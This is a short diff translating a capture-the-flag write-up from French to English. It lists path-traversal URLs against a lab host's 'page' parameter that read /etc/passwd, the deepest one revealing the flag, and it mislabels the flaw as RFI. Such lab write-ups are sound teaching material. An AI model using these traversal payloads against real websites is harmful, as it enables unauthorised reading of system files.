@@ -1,10 +1,9 @@
-une expoit de type RFI est possible sur cette url : http://172.18.254.134/?page=
-En essayant plusieurs combinaison, nous obtenions des msg differents: 
-
+An RFI type exploit is possible on this URL: http://172.18.254.134/?page=
+By trying several combinations, we obtained different messages:
 
 http://172.18.254.134/?page=../etc/passwd wtf? 
 http://172.18.254.134/?page=../../../etc/passwd try again...
 http://172.18.254.134/?page=../../../../../../etc/passwd almost !
 http://172.18.254.134/?page=../../../../../../../../../etc/passwd
-Le dernier nous donne le flag
+The last one gives us the flag
 
